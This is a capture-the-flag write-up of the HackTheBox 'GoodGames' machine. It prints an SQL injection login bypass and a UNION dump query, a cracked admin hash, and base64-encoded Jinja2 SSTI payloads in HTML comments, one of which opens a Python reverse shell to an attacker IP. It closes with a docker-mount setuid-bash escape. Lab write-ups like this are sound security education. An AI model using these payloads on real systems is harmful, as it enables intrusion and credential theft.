---
title: Hackthebox - GoodGames
date: 2022-03-01 00:00:00 +0530
categories: [hackthebox, linux]
tags: [sqli, ssti, docker escape]     # TAG names should always be lowercase
image: /assets/img/posts/goodGames/goodgames_banner.png
---


![](/assets/img/posts/goodGames/goodgames_banner.png)



<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></a>
</p>

# Enumeration

**IP-ADDR:** 10.10.11.130 goodGames.htb

**nmap scan:**
```bash
PORT   STATE SERVICE  VERSION
80/tcp open  ssl/http Werkzeug/2.0.2 Python/3.9.2
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-title: GoodGames | Community and Store
```

* Hostname: `GoodGames.HTB`

A normal looking web app talking about video games

![](/assets/img/posts/goodGames/web-front.png)

There is a option for signup/login

![](/assets/img/posts/goodGames/web-signup.png)

There is really simple sql injection in email parameter to bypass login and get admin 

![](/assets/img/posts/goodGames/sqli-login.png)

After login, there is a extra settings icon in top right corner which redirect to a subdomain `internal-administration.goodgames.htb`

Another login page form subdomain

![](/assets/img/posts/goodGames/sub-login.png)

# Foothold

## SQLi

back to the login sql injection, There's a reflected field in login

![](/assets/img/posts/goodGames/login-union-injection.png)

Dump database

* database_name: main
* table: user
* column: id,email,password,name

```
' UNION SELECT ALL 1,2,3,group_concat(id,":",email,":",password,":",name) from main.user#
```

![](/assets/img/posts/goodGames/dump-login-creds.png)


password cracked with john using rockyou.txt
```
1:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec:admin:superadministrator
```

And these creds reuse in subdomain Flask Dashboard

![](/assets/img/posts/goodGames/volt-logged-in.png)


## SSTI

In the volt dashboard, found SSTI(Server-Side Template Injection) in `/settings` reflected in the user's profile name

![](/assets/img/posts/goodGames/ssti-in-name.png)

* From nmap scan, this is a Python server so template framework is possibly jinja2.


Payload form [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-subprocesspopen)

![](/assets/img/posts/goodGames/ssti-payload1.png)

<!-- e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdpZCcpLnJlYWQoKX19 -->

![](/assets/img/posts/goodGames/ssti-rce.png)

Get reverse shell with [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)

![](/assets/img/posts/goodGames/ssti-payload2.png)

<!-- eyUgZm9yIHggaW4gKCkuX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiAid2FybmluZyIgaW4geC5fX25hbWVfXyAlfXt7eCgpLl9tb2R1bGUuX19idWlsdGluc19fWydfX2ltcG9ydF9fJ10oJ29zJykucG9wZW4oInB5dGhvbjMgLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKFwiMTAuMTAuMTQuMzdcIiw0MTQxKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbXCIvYmluL2Jhc2hcIl0pOyciKS5yZWFkKCkuemZpbGwoNDE3KX19eyVlbmRpZiV9eyUgZW5kZm9yICV9 -->

Get root shell inside docker container.

# Privesc

## Docker escape

Running [deepce.sh](https://github.com/stealthcopter/deepce) script, find host mounts
```bash
====================================( Enumerating Mounts )====================================
[+] Docker sock mounted ....... No
[+] Other mounts .............. Yes
/home/augustus /home/augustus rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
[+] Possible host usernames ... augustus rw,relatime - ext4 
```

`/home/augustus` directory contains user flag and user `augustus` in not in the docker container.

Host is reachable from container and running ssh

![](/assets/img/posts/goodGames/ssh-verify.png)


ssh to host using reused password `superadministrator` for user "augustus"

![](/assets/img/posts/goodGames/ssh-to-host.png)


## Host mount inside docker

We know that `/home/augustus` mounted in the container and we are root in the container.

That means we can create any file or edit any file inside `/home/augustus` directory as root.

just copy host bash binary in user's directory and give suid permission as root from container.

```bash
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ exit
root@3a453ab39d3d:/home/augustus$ chown root:root bash
root@3a453ab39d3d:/home/augustus$ chmod +s bash
root@3a453ab39d3d:/home/augustus$ ssh augustus@172.19.0.1
augustus@GoodGames:~$ ./bash -p
```

![](/assets/img/posts/goodGames/rooted.png)